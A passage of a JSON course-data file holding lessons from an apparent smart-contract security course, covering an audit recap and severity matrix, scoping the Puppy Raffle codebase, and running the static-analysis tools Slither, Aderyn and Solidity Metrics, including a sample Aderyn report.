          "slug": "recap-&-congrats",
          "folderName": "31-recap-&-congrats",
          "description": "",
          "duration": 9,
          "videoUrl": "dUiPgdeN7ksisuykAP4mpgPxn33jurP2fWIeDoHDCyk",
          "rawMarkdownUrl": "/routes/security/3-first-audit/31-recap-&-congrats/+page.md",
          "markdownContent": "---\ntitle: Recap & Congrats\n---\n\n_Follow along with this video:_\n\n---\n\nLet's recap everything we've learnt in this lesson so far - it's been a lot.\n\n### Onboarding\n\nWe learnt the importance of thoroughly onboarding a protocol. Often we'll receive audit requests without context or preparation (ie random etherscan links) and it's our job to advise the protocol that these are inappropriate. We should educate them on steps required to be ready for an audit. Think back to our [**minimal-onboarding-questions**](https://github.com/Cyfrin/3-passwordstore-audit/blob/onboarded/minimal-onboarding-questions.md)\n\n**About the Project** - Summary of the project\n\n**Setup** - What tools are needed to setup the codebase & test suite?\n\n**Testing** - How to run tests, how to see test coverage\n\n**Scope** - Specific details of the security review, which contracts are to be audited, the specific commit hash being reviewed\n\n**Compatibilities** - Chains for deployment, compatible tokens, solc versions\n\n**Roles** - What are the different actors of the system? What are their powers meant to be?\n\n**Known Issues** - Any issues the protocol is aware of already.\n\n### Codebase Size\n\nAnother thing we covered was how to determine a codebase's size and complexity using tools like [**Solidity Metrics**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-metrics) and [**CLOC**](https://github.com/AlDanial/cloc).\n\nThese tools allow us to count lines of code, estimate complexity and - in the case of Solidity Metrics - see breakdowns of how the protocol interconnects and which functions are visible.\n\nThese tools are primarily valuable in that they allow us the ability to estimate a work load or timeframe required for a thorough audit.\n\n### The phases of an audit\n\nWe covered the phases of an audit and each steps within.\n\n- Initial Review\n  - Scoping - This is getting a sense of the protocol. In this phase, auditors go through the code to scope it. This gives an idea of how much time might be required for the audit, which can then be used to establish pricing. Key tasks include identification of all the contractâ€™s dependencies and a general overview of the code. At this stage, auditors donâ€™t dig deep into anything yet.\n  - Reconnaissance - Here an auditor starts walking through the code, running tools, interacting with the protocol in an effort to break it.\n  - Vulnerability Identification - An auditor determines which vulnerabilities are present and how they're exploited as well as mitigation.\n  - Reporting - Compile a report detailing all of the identified vulnerabilities and recommendations to make the protocol more secure.\n  ***\n- Protocol Fixes\n  - Fixes Issues\n  - Retests and adds tests\n- Mitigation Review\n  - Reconnaissance\n  - Vulnerability Identification\n  - Reporting\n\n### The Tincho\n\nThe legendary Tincho from [**The Red Guild**](https://blog.theredguild.org/) blessed us with his wisdom and experience, outlining the approach he takes while peforming a security review. He stresses:\n\n- Read the docs\n- Take notes often - right in the codebase\n- Small > Large - start on the easiest contracts and advance into more complex ones\n- Leverage tools like [**Solidity Metrics**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-metrics) to breakdown a hierarchy of complexity/size within a codebase\n\n### First Security Review\n\nWe performed our first security review of the PasswordStore protocol!\n\nApplying the steps of a security review we were able to uncover 3 vulnerabilities within the protocol:\n\n---\n\n[H-1] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n\n[H-2] Storing the password on-chain makes it visible to anyone and no longer private\n\n[I-1]The `PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect.\n\n---\n\nWe also learnt how to classify the severities of our findings! Remember the matrix:\n\n|            |        | Impact |        |     |\n| ---------- | ------ | ------ | ------ | --- |\n|            |        | High   | Medium | Low |\n|            | High   | H      | H/M    | M   |\n| Likelihood | Medium | H/M    | M      | M/L |\n|            | Low    | M      | M/L    | L   |\n\n1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.\n2. **Medium Impact**: `funds` are `indirectly at risk` or thereâ€™s `some level of disruption` to the protocolâ€™s functionality.\n3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.\n\n---\n\n1. **High Likelihood**: Highly probably to happen.\n   - a hacker can call a function directly and extract money\n2. **Medium Likelihood**: Might occur under specific conditions.\n   - a peculiar ERC20 token is used on the platform.\n3. **Low Likelihood**: Unlikely to occur.\n   - a hard-to-change variable is set to a unique value at a specific time.\n\n### Creating Findings Reports\n\nWe covered how to turn those findings into a professional breakdown using this template:\n\n---\n\n```\n### [S-#] TITLE (Root Cause + Impact)\n\n**Description:** - Succinctly detail the vulnerability\n\n**Impact:** - The affects the vulnerability has\n\n**Proof of Concept:** - Programmatic proof of how the vulnerability is exploited\n\n**Recommended Mitigation:** Recommendations on how to fix the vulnerability\n```\n\n---\n\n### Timeboxing\n\nWe briefly covered the importance of timeboxing. We'll always be able to further scrutinize a codebase - time management and constraining our time investments is how we become efficient security reviewers.\n\n### Professional PDF Report\n\nAnd finally, we walked through the steps needed to create a beautiful PDF report using our [**audit-report-templating**](https://github.com/Cyfrin/audit-report-templating) repo.\n\nLeveraging new tools like [**Pandoc**](https://pandoc.org/installing.html) and [**LaTex**](https://www.latex-project.org/) we were able to convert our markdown report into a presentable PDF that we're now proudly displaying on our own GitHub Security Reviewer portfolio.\n\n### Wrap Up\n\nWooooow. That's a lot when you put it all together like that. You should be incredibly proud of your progress so far. Take a break, stretch your legs, tweet your successes and then come back.\n\nThe next security review is going to be _SICK_.\n",
          "updates": []
        }
      ]
    },
    {
      "number": 4,
      "sectionId": "131e6eb2-4fa2-4f48-a788-33a008abf278",
      "title": "Puppy raffle",
      "slug": "puppy-raffle",
      "folderName": "4-puppy-raffle",
      "lessons": [
        {
          "lessonId": "9b46fac7-d345-4a64-afa2-54f6f7c2c8fe",
          "number": 1,
          "title": "Introduction",
          "slug": "introduction",
          "folderName": "1-introduction",
          "description": "",
          "duration": 5,
          "videoUrl": "02Yjab00x9Nd01Dn5e1Z3oWthPxq91ihNv5uHIASObiJF00",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/1-introduction/+page.md",
          "markdownContent": "---\ntitle: Introduction\n---\n\n_Follow along with this video:_\n\n---\n\n## Puppy Raffle Audit\n\nWelcome to Section 4: Puppy Raffle Audit! In addition to strengthening our skills in manual review, in this section we'll be introducing powerful tools and leveraging `static analysis` to help us secure this protocol.\n\nWe'll see the differences between a private audit report and a competitive audit submission and be introduced to the process of competing in a CodeHawks First Flight!\n\n### CodeHawks First Flights\n\nCodeHawks First Flights offer an excellent platform for budding smart contract security researchers. This platform contains relatively easy-to-understand codebases that resemble those you will find in this course.\n\nIf you are a beginner, they are a perfect opportunity to get live auditing experience and build upon the things you've learnt in a practical setting. For experienced auditors, they serve as a chance to engage in the community and itterate on your established skills.\n\n<img src=\"/security-section-4/1-introduction/introduction1.png\" style=\"width: 100%; height: auto;\">\n\nWe'll be going over how to submit an awesome competitive finding in this section.\n\n### Tooling\n\nAs mentioned above, we'll be using new tools to help us in finding vulnerabilities and familiarizing ourselves with `static analysis`. We'll be using:\n\n- [**Slither**](https://github.com/crytic/slither) - A pythonic static analysis tool compatible with Solidity and Vyper\n- [**Aderyn**](https://github.com/Cyfrin/aderyn) - Built in Rust by _Alex Roan_, Aderyn traverses Abstract Syntax Trees to highlight suspected vulnerabilities.\n\nThrough this section, you will:\n\n- Familiarize yourself with your first set of tooling.\n- Understand what static analysis is and its role in enhancing protocol security.\n- Gain an insight into the different exploits in this codebase.\n- Finally, learn how to write reports of competitive audits and differentiate them from private audits.\n\n### So Many Bugs\n\nOur previous codebase was quite small, Puppy Raffle has more to it and as a result, there are many more bugs to find! There are at least FOUR HIGHs to find in this repo (and likely some I didn't even account for ðŸ˜‹).\n\n### Case Studies\n\nAs we uncover vulnerabilities in the Puppy Raffle codebase, we'll dive into real world case studies detailing times these vulnerabilities were exploited in the wild.\n\nThis should give you real insight into what's at stake as we're performing security reviews and really instill that these efforts of ours matter.\n\n### Exercises\n\nAt the end of the section we'll have _even more_ excercises for you to expand on your knowledge and challenge yourself beyond the course's teachings. These are your opportunities to branch out, network and gain additional experience.\n\nThis includes participating in a CodeHawks First Flight or a competitive audit! Get ready!\n\n### Prep for Puppy Raffle\n\nIf you take a look at the [**repo**](https://github.com/Cyfrin/4-puppy-raffle-audit) associated with this section, you'll see a fairly robust README already supplied. For this review, we're assuming the protocol has already undergone some degreee of onboarding and they've provided us a respectable repo.\n\nI will transparently point out that, much like our previous protocol review, this repo has multiple branches, one of which is the `audit-data` branch. I **STRONGLY** encourage you to resist peeking in this branch until the end. The `audit-data` branch effectively serves as an `answer key`, in which all the vulnerabilities and write-ups can be found.\n\nGoing through the codebase throughout the course, and appreciating each step is how you're going to build these skills. Uncovering the attack vectors is how you build familiarity with these risks. Skipping over steps is only going to harm your progress. Build the habits, do the work.\n",
          "updates": []
        },
        {
          "lessonId": "0af77dc7-3aa4-4ba0-9d07-2cf85bacea1c",
          "number": 2,
          "title": "Puppy raffle primer",
          "slug": "puppy-raffle-primer",
          "folderName": "2-puppy-raffle-primer",
          "description": "",
          "duration": 2,
          "videoUrl": "QrZX01ONG5oJ1ciOXhw1B2G88pF9BWB5IP3FIw8pgQAw",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/2-puppy-raffle-primer/+page.md",
          "markdownContent": "---\ntitle: Puppy Raffle Primer\n---\n\n_Follow along with this video:_\n\n---\n\n### Puppy Raffle Primer\n\nAlright! Before we jump into this process I want to mention a couple things:\n\n1. Do **not** look at the `audit-data` branch of the course [**repo.**](https://github.com/Cyfrin/4-puppy-raffle-audit). This is our `answer key`.\n\n2. Take some time to scope the codebase yourself before proceeding. Try to go through the process we just did with PasswordStore and challenge yourself to find what you can here.\n\nDon't spend _too much_ time trying things yourself. Spend 20-30 minutes doing your best and if you feel like you're getting nowhere, or you're unsure what to do - just stop. We can do it together.\n\nIf you feel like you're cooking and you've found a few bugs - keep going. Repeating this process and becoming comfortable with doing it yourself is an important part of learning.\n\nPuppy Raffle is a phenomenal codebase to gain valuable security review experience on. So try your best on your own first, and when you're ready - let's move onto the Scoping phase together!\n",
          "updates": []
        },
        {
          "lessonId": "2951f741-904b-4b98-a3fc-91cd1c5fd334",
          "number": 3,
          "title": "Phase 1: Scoping",
          "slug": "phase-1-scoping",
          "folderName": "3-phase-1-scoping",
          "description": "",
          "duration": 4,
          "videoUrl": "QXA0077rZrBDjU3JlIMEJJPM45AyU12RjdL1Y4sUax02g",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/3-phase-1-scoping/+page.md",
          "markdownContent": "---\ntitle: Phase 1 - Scoping\n---\n\n_Follow along with this video:_\n\n---\n\n### Puppy Raffle Scoping\n\nNow that you've **definitely** tried reviewing the codebase on your own, let's start scoping things out together.\n\nTake a look at the [**Puppy Raffle Repo**](https://github.com/Cyfrin/4-puppy-raffle-audit)'s README\n\n<img src=\"static/security-section-4/3-phase-1-scoping/phase-1-scoping1.png\" style=\"width: 50%; height: auto;\">\n\n### README Overview\n\nThis README looks pretty good. We've got all the expected sections and necessary details.\n\nRemember the things we're looking for:\n\n- **About**\n- **Setup**\n- **Scope**\n- **Compatibilities**\n- **Roles**\n- **Known Issues**\n\nWe should see clear instructions under [**Getting Started**](https://github.com/Cyfrin/4-puppy-raffle-audit#getting-started) on how to get set up locally.\n\n```bash\ngit clone https://github.com/Cyfrin/4-puppy-raffle-audit.git\ncd 4-puppy-raffle-audit.git\nmake\n```\n\n> Take a brief look at your `Makefile`. It's worthwhile to appreciate what it's actually doing. Our `Makefile` cleans our repo, installs necessary packages (Foundry, OpenZeppelin and base64) and then runs `forge build` to compile everything.\n\n### Testing\n\nOnce we've run our `make` command, we should check out the protocol tests. I like to start by running `forge coverage` to see what kind of baseline we're starting with.\n\n<img src=\"/security-section-4/3-phase-1-scoping/phase-1-scoping2.png\" style=\"width: 50%; height: auto;\">\n\nThing's don't look great.\n\nFrom a competitive audit point of view, this might be exciting, there are lots of opportunities for bugs to be hiding in this codebase.\n\nIf we were doing a private audit, we're less optimistic. Poor test coverage is indicative of an immature codebase and we're responsible for securing this protocol!\n\n### README Continued\n\nFurther down the README we see the scope details. Invaluable information.\n\nBy using the command `git checkout <commitHash>` we can assure our local repo is the correct version to be auditing.\n\nWe also see exactly which contracts are under review.\n\n    ./src/\n    â””â”€â”€ PuppyRaffle.sol\n\nMoving on, we should take notice of the **Compatibilities** section.\n\n<img src=\"/security-section-4/3-phase-1-scoping/phase-1-scoping3.png\" style=\"width: 50%; height: auto;\">\n\nThat Solc version is strange - definitely make note of it.\n\nFinally, they've also outlined the Roles of the protocol for us. Knowing this intended functionality is important in being able to spot when things go wrong.\n\n- Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the changeFeeAddress function.\n- Player - Participant of the raffle, has the power to enter the raffle with the enterRaffle function and refund value through refund function.\n\nThere are no _known_ issues. Hehe.\n\n### Wrap Up\n\nThings are looking great so far, the protocol has provided us with lots of documentation to get started with. We've even spotted an oddity already.\n\nIn the next lesson we'll begin using our tools to spot vulnerabilities before we even start.\n",
          "updates": []
        },
        {
          "lessonId": "d6c942d9-d7fb-4b1b-a29b-14e55b2a8f6e",
          "number": 4,
          "title": "Tooling: Slither",
          "slug": "tooling-slither",
          "folderName": "4-tooling-slither",
          "description": "",
          "duration": 6,
          "videoUrl": "WH00nL8yLV00AYJRsTcNGbYUJeWDB8qeABsODj7ZilE3o",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/4-tooling-slither/+page.md",
          "markdownContent": "---\ntitle: Tooling - Slither\n---\n\n_Follow along with this video:_\n\n---\n\n### Leveraging our Tools\n\nAuditing smart contracts is an arduous yet essential task in the blockchain realm. To facilitate this process, there are excellent tools to help auditors catch bugs efficiently. In this post, we'll explore two popular static analysis tools that can significantly speed up the auditing process: Slither and Aderyn. Having knowledge of these tools isn't just beneficial for auditors â€” anyone aiming to be a top developer should consider these tools as an essential part of their toolbox.\n\n### Static Analysis - Boosting Your Auditing Efficiency\n\n<img src=\"/security-section-4/4-tooling-slither/tooling-slither1.png\" style=\"width: 75%; height: auto;\">\n\nStatic analysis is a method where code is checked for potential issues without actually executing it. Essentially, it's a way to \"debug\" your code by looking for specific keywords in a certain order or pattern.\n\nThe most widely used tools for this purpose include [**Slither**](https://github.com/crytic/slither), developed by the [**Trail of Bits**](https://www.trailofbits.com/) team, and a Rust-based tool that we've developed known as [**Aderyn**](https://github.com/Cyfrin/aderyn).\n\n> **Note**: It's important to remember that these tools should be run before going for an audit.\n\n### Slither - A Python-Powered Static Analysis Tool\n\nSlither tops the charts as the most popular and potentially the most potent static analysis tool available. Built using Python, it offers compatibility with both Solidity and Vyper developments. An open-source project, Slither allows developers to add plugins via PR.\n\nThe Slither repo provides instructions on installation and usage.\n\nI want to bring your attention to the [**Detectors**](https://github.com/crytic/slither/wiki/Detector-Documentation) section of the documentation.\n\nThis document lists _all_ the vulnerabilities that Slither is checking for and recommendations for them.\n\nFor example:\n\n<img src=\"/security-section-4/4-tooling-slither/tooling-slither2.png\" style=\"width: 75%; height: auto;\">\n\nThis could have helped us with PasswordStore! It's easy to see how valuable these tools can be in making our work easier and more efficient.\n\n### Installing Slither\n\nWe won't go over the specifics of installation in this course. As intermediate developers, we should have some familiarity with this process.\n\nChoose the installation method that works best for you (Options outlined here), and if you run into issues don't hesitate to ask an AI like [**Phind**](https://www.phind.com/search?home=true) or [**ChatGPT**](https://chat.openai.com). They're great at debugging installation problems.\n\n> **Note:** In addition to Slither, you may need to install [**Python**](https://www.python.org/downloads/), if you haven't.\n\nOnce installed ensure everything is up-to-date with:\n\n```bash\npip3 install --upgrade slither-analyzer\n```\n\n### Running Slither\n\nThe Slither documentation outlines usage for us. Slither will automatically detect if the project is a Hardhat, Foundry, Dapp or Brownie framework and compile things accordingly.\n\nIn order to run slither on our current repo we just use the command:\n\n```bash\nslither .\n```\n\nThis execution may take some time, depending on the size of the codebase. If we run it on Puppy Raffle, we're going to get a _massive_ output of potential issues.\n\nThe output color codes potential issues:\n\n- **Green** - Areas that are probably ok, may be `informational` findings, we may want to have a look\n- **Yellow** - Potential issue detected, we should probably take a closer look\n- **Red** - Signifant issues detected that should absolutely be addressed.\n\nHere's an example of what some of these look like:\n\n<img src=\"/security-section-4/4-tooling-slither/tooling-slither3.png\" style=\"width: 75%; height: auto;\">\n\n### Wrap Up\n\nBy leveraging Slither, audits become more efficient, making it a fantastic tool for developers who are looking to minimize the time they spend on debugging and maximize their protocol's security.\n\n> Always remember, static analysis tools enhance our security review, they don't replace our manual efforts!\n",
          "updates": []
        },
        {
          "lessonId": "76b4b6ad-f6df-4073-8f6f-f87b91f2e2db",
          "number": 5,
          "title": "Tooling: Aderyn",
          "slug": "tooling-aderyn",
          "folderName": "5-tooling-aderyn",
          "description": "",
          "duration": 2,
          "videoUrl": "cYAn1V8VKFyg4pDqHeigrlN2ttJhwI1ZQHZRKOFYLc8",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/5-tooling-aderyn/+page.md",
          "markdownContent": "---\ntitle: Tooling - Aderyn\n---\n\n_Follow along with this video:_\n\n---\n\n### Introducing Aderyn: A Rust Based Static Analysis Tool\n\nThe second powerful tool we'll be using in this course is a Rust-based analyzer, [**Aderyn**](https://github.com/Cyfrin/aderyn). This tool was created by the smart contract developer legend [**Alex Roan**](https://github.com/alexroan).\n\n### Installation of Aderyn\n\nBefore we can use `Aderyn`, we'll need to first install `Rust`. Like `Slither`, we won't go over the specifics of installation, but you can find a guide with installation options available to you [**here**](https://www.rust-lang.org/tools/install).\n\n> Remember: If you have issues with installation, AI is great at helping with this, you can also leverage the communities on Stack Overflow!\n\nOnce `Rust` has been installed, you can run the command `cargo install Aderyn`. This will install our tool.\n\n<img src=\"/security-section-4/5-tooling-aderyn/tooling-aderyn1.png\" style=\"width: 75%; height: auto;\">\n\n> **Note:** If you've already installed Aderyn, this command will also update you to the current version. Your terminal will advise if the tool is already installed.\n\n### Running Aderyn\n\nTo run Aderyn, the command is `Aderyn [OPTIONS] <root>`. Since we're already in the root directory of our project, we can just run:\n\n```bash\naderyn .\n```\n\nRunning this command will compile our contracts, our terminal will display the usual compilation warnings - at the bottom of the output however, we can see _`Detectors run, printing report. Report printed to ./report.md`_\n\nWe should see this fine in our IDE explorer. If we open it up...\n\n<details closed>\n<summary>Puppy Raffle Aderyn Report</summary>\n\n# Aderyn Analysis Report\n\nThis report was generated by [Aderyn](https://github.com/Cyfrin/aderyn), a static analysis tool built by [Cyfrin](https://cyfrin.io), a blockchain security company. This report is not a substitute for manual audit or security review. It should not be relied upon for any purpose other than to assist in the identification of potential security vulnerabilities.\n\n# Table of Contents\n\n- [Aderyn Analysis Report](#aderyn-analysis-report)\n- [Table of Contents](#table-of-contents)\n- [Summary](#summary)\n  - [Files Summary](#files-summary)\n  - [Files Details](#files-details)\n  - [Issue Summary](#issue-summary)\n- [Medium Issues](#medium-issues)\n  - [M-1: Centralization Risk for trusted owners](#m-1-centralization-risk-for-trusted-owners)\n- [Low Issues](#low-issues)\n  - [L-1: `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-1-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256)\n  - [L-2: Solidity pragma should be specific, not wide](#l-2-solidity-pragma-should-be-specific-not-wide)\n  - [L-3: Conditional storage checks are not consistent](#l-3-conditional-storage-checks-are-not-consistent)\n- [NC Issues](#nc-issues)\n  - [NC-1: Missing checks for `address(0)` when assigning values to address state variables](#nc-1-missing-checks-for-address0-when-assigning-values-to-address-state-variables)\n  - [NC-2: Functions not used internally could be marked external](#nc-2-functions-not-used-internally-could-be-marked-external)\n  - [NC-3: Constants should be defined and used instead of literals](#nc-3-constants-should-be-defined-and-used-instead-of-literals)\n  - [NC-4: Event is missing `indexed` fields](#nc-4-event-is-missing-indexed-fields)\n    - [Wrap Up](#wrap-up)\n\n# Summary\n\n## Files Summary\n\n| Key         | Value |\n| ----------- | ----- |\n| .sol Files  | 1     |\n| Total nSLOC | 143   |\n\n## Files Details\n\n| Filepath            | nSLOC   |\n| ------------------- | ------- |\n| src/PuppyRaffle.sol | 143     |\n| **Total**           | **143** |\n\n## Issue Summary\n\n| Category | No. of Issues |\n| -------- | ------------- |\n| Critical | 0             |\n| High     | 0             |\n| Medium   | 1             |\n| Low      | 3             |\n| NC       | 4             |\n\n# Medium Issues\n\n## M-1: Centralization Risk for trusted owners\n\nContracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.\n\n- Found in src/PuppyRaffle.sol [Line: 18](src/PuppyRaffle.sol#L18)\n\n  ```solidity\n  contract PuppyRaffle is ERC721, Ownable {\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 167](src/PuppyRaffle.sol#L167)\n\n  ```solidity\n      function changeFeeAddress(address newFeeAddress) external onlyOwner {\n  ```\n\n# Low Issues\n\n## L-1: `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\n\nUse `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). Unless there is a compelling reason, `abi.encode` should be preferred. If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).\nIf all arguments are strings and or bytes, `bytes.concat()` should be used instead.\n\n- Found in src/PuppyRaffle.sol [Line: 197](src/PuppyRaffle.sol#L197)\n\n  ```solidity\n              abi.encodePacked(\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 201](src/PuppyRaffle.sol#L201)\n\n  ```solidity\n                          abi.encodePacked(\n  ```\n\n## L-2: Solidity pragma should be specific, not wide\n\nConsider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`\n\n- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)\n\n  ```solidity\n  pragma solidity ^0.7.6;\n  ```\n\n## L-3: Conditional storage checks are not consistent\n\nWhen writing `require` or `if` conditionals that check storage values, it is important to be consistent to prevent off-by-one errors. There are instances found where the same storage variable is checked multiple times, but the conditionals are not consistent.\n\n- Found in src/PuppyRaffle.sol [Line: 140](src/PuppyRaffle.sol#L140)\n\n  ```solidity\n          if (rarity <= COMMON_RARITY) {\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 142](src/PuppyRaffle.sol#L142)\n\n  ```solidity\n          } else if (rarity <= COMMON_RARITY + RARE_RARITY) {\n  ```\n\n# NC Issues\n\n## NC-1: Missing checks for `address(0)` when assigning values to address state variables\n\nAssigning values to address state variables without checking for `address(0)`.\n\n- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)\n\n  ```solidity\n          feeAddress = _feeAddress;\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 150](src/PuppyRaffle.sol#L150)\n\n  ```solidity\n          previousWinner = winner;\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 168](src/PuppyRaffle.sol#L168)\n\n  ```solidity\n          feeAddress = newFeeAddress;\n  ```\n\n## NC-2: Functions not used internally could be marked external\n\n- Found in src/PuppyRaffle.sol [Line: 79](src/PuppyRaffle.sol#L79)\n\n  ```solidity\n      function enterRaffle(address[] memory newPlayers) public payable {\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 96](src/PuppyRaffle.sol#L96)\n\n  ```solidity\n      function refund(uint256 playerIndex) public {\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 189](src/PuppyRaffle.sol#L189)\n\n  ```solidity\n      function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n  ```\n\n## NC-3: Constants should be defined and used instead of literals\n\n- Found in src/PuppyRaffle.sol [Line: 86](src/PuppyRaffle.sol#L86)\n\n  ```solidity\n          for (uint256 i = 0; i < players.length - 1; i++) {\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 87](src/PuppyRaffle.sol#L87)\n\n  ```solidity\n              for (uint256 j = i + 1; j < players.length; j++) {\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 127](src/PuppyRaffle.sol#L127)\n\n  ```solidity\n          require(players.length >= 4, \"PuppyRaffle: Need at least 4 players\");\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 132](src/PuppyRaffle.sol#L132)\n\n  ```solidity\n          uint256 prizePool = (totalAmountCollected * 80) / 100;\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 133](src/PuppyRaffle.sol#L133)\n\n  ```solidity\n          uint256 fee = (totalAmountCollected * 20) / 100;\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 139](src/PuppyRaffle.sol#L139)\n\n  ```solidity\n          uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;\n  ```\n\n## NC-4: Event is missing `indexed` fields\n\nIndex event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n- Found in src/PuppyRaffle.sol [Line: 53](src/PuppyRaffle.sol#L53)\n\n  ```solidity\n      event RaffleEnter(address[] newPlayers);\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 54](src/PuppyRaffle.sol#L54)\n\n  ```solidity\n      event RaffleRefunded(address player);\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 55](src/PuppyRaffle.sol#L55)\n\n  ```solidity\n      event FeeAddressChanged(address newFeeAddress);\n  ```\n\n</details>\n\n---\n\n_**WOW!**_ We have a report of vulnerabilities already gorgeously formatted and ready to be added to our audit report.\n\n### Wrap Up\n\nFast, and efficient, [**Aderyn**](https://github.com/Cyfrin/aderyn) offers a swift vulnerability report of your smart contracts which is almost ready to be presented. Aesthetically neat and structurally organized, the tool is a quick starter for anyone performing security reviews. We'll be leveraging the poweer of Aderyn throughout the course!.\n\nLet's look at one more tool briefly in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "3dec10d0-e6c7-4d0d-a220-fcdcad3d42c6",
          "number": 6,
          "title": "Tooling: Solidity Visual Developer",
          "slug": "tooling-solidity-visual-developer",
          "folderName": "6-tooling-solidity-visual-developer",
          "description": "",
          "duration": 3,
          "videoUrl": "Dek01sy02wtQk00J2Kfrf4302V68TYm00VPBXMHYLxPIcYtM",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/6-tooling-solidity-visual-developer/+page.md",
          "markdownContent": "---\ntitle: Tooling - Solidity Visual Developer\n---\n\n_Follow along with this video:_\n\n---\n\n### Tools in our Belt\n\nWe've already got a handful of tools at our disposal.\n\n- `Slither`\n- `Aderyn`\n- `CLOC`\n\nWe also went over `Solidity Metrics` earlier, but let's take another look as `Puppy Raffle` is going to afford us some more interesting insight into the power of this tool.\n\n> Remember: you can right-click your `src` folder in the `Puppy Raffle` workspace and select `Solidity: Metrics` from the context menu to run the tool on that directory.\n\n### Solidity Metrics Insights\n\nScrolling to the bottom of the `Solidity: Metrics` report, take a look at the `Inheritence Graph`\n\n<img src=\"/security-section-4/6-tooling-svd/tooling-svd1.png\" style=\"width: 75%; height: auto;\">\n\nFrom this illustration we can see that the contract `PuppyRaffle` is of types `ERC721` and `Ownable`.\n\nA little further down we see a `Call Graph`\n\n<img src=\"/security-section-4/6-tooling-svd/tooling-svd2.png\" style=\"width: 75%; height: auto;\">\n\nThis provides us a clear reference of which functions are being called by which other functions!\n\nAnd finally `Solidity: Metrics` gives us a `Contract Summary`\n\n<img src=\"/security-section-4/6-tooling-svd/tooling-svd3.png\" style=\"width: 75%; height: auto;\">\n\nThis is incredibly valuable. It provides is a clear breakdown of `Internal` vs `External functions` as well as identifies which functions are `payable` and can `modify state`!\n\n### Solidity Visual Developer\n\nThere's another tool I'll briefly mention - some developers swear by it. It's the extension [**Solidity Visual Developer**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor) for VS Code.\n\nIn addition to providing very similar reporting as Solidity Metrics, the inheritence graph is interactive and it provides syntax highlighting in your code based on variable types.\n\n<img src=\"/security-section-4/6-tooling-svd/tooling-svd4.png\" style=\"width: 75%; height: auto;\">\n\nCheck it out if you feel it would be useful for adding some clarity to your development and security reviews!\n\nNext we're going to dive deeper into the exciting world of static analysis tools. We'll take a closer look at the Solidity Metrics tool, which we introduced before, and also explore another tool known as Solidity Visual Developer.\n\n### Wrap Up\n\nNow that we've a firm grasp of our tooling options available, let's get started on this `Puppy Raffle` review. We're onto `Recon` - let's start with the documentation.\n",
          "updates": []
        },
        {
          "lessonId": "9e5aea50-0a65-4d44-940c-5ca0f7662c9f",
          "number": 7,
          "title": "Recon: Reading docs",
          "slug": "recon-reading-docs",
          "folderName": "7-recon-reading-docs",
          "description": "",
          "duration": 2,
          "videoUrl": "ZVGX01fRYnBjs4V00gHyS9apA1nHgA102Ed501KvqezHyzc",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/7-recon-reading-docs/+page.md",
